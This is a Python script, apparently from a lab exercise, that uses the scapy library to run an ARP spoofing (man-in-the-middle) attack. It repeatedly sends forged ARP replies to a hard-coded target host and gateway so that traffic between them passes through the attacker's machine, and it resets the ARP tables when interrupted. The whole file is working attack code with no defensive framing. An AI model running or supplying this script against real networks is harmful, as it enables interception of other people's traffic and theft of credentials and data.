#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):
    res = scapy.arping(ip, verbose=False)[0]

    mac = res[0][1].hwsrc
    return mac


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    dst_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dst_mac, hwsrc=src_mac, psrc=source_ip)
    scapy.send(packet, verbose=False, count=8)


counter = 0
target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        counter = counter + 2
        print("\r[+] Packets Sent: " + str(counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] DETECTED CTRL+C.....RESETTING ARP TABLES...Please wait")
    spoof(target_ip, gateway_ip)
    spoof(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
